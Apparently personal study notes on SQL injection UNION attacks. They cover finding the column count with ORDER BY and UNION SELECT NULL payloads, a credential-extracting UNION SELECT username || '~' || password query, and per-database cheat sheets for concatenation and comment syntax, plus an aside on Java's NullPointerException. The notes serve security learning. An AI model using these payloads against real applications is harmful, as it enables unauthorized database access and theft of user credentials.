## Determining the number of columns required in an SQL injection UNION attack
1. injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
The ORDER BY position number 3 is out of range of the number of items in the select list.
-- this means have 2 columns
```

2. submitting a series of UNION SELECT payloads specifying a different number of null If the number of nulls does not match the number of columns, the database returns an error.
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```
The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. 
for the 2nd way, If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException. Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.

On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:

```sql
' UNION SELECT NULL FROM DUAL--
```
The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.

## what is NullPointerException
NullPointerException is an error in Java programming language. It occurs when an application tries to access an object or its member variables or methods, but the object is null or does not exist.

In Java, variables are declared with a specific data type, such as int, float, or String. When a variable is declared, it is either assigned a value or remains null until a value is assigned to it. When an application tries to access an object that has a null value, the NullPointerException is thrown.

The NullPointerException can be caused by a variety of factors, including:

1. Not properly initializing an object or variable
2. Incorrectly checking for null values before accessing objects or variables
3. Modifying objects or variables in unexpected ways, causing them to become null

Handling NullPointerException is an important aspect of Java programming, as it helps to prevent crashes and unexpected behavior in an application. Common techniques to handle NullPointerException include using conditional statements to check for null values before accessing objects or variables, and using try-catch blocks to handle the exception when it occurs.

## Retrieving multiple values within a single column
retrieve multiple values together within this single column by concatenating
For example, on Oracle you could submit the input:

```sql
' UNION SELECT username || '~' || password FROM users--
```
This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.
Note that different databases use different syntax to perform string concatenation

## String concatenation
You can concatenate together multiple strings to make a single string.
```sql
Oracle and PostgreSQL	'foo'||'bar'
Microsoft	'foo'+'bar'
MySQL	'foo' 'bar' [Note the space between the two strings] OR CONCAT('foo','bar')
```

## comments
```sql
--comment => Oracle, Microsoft, PostgreSQL
/*comment*/ => Microsoft, PostgreSQL, MySQL
#comment and -- comment => MySQL
```
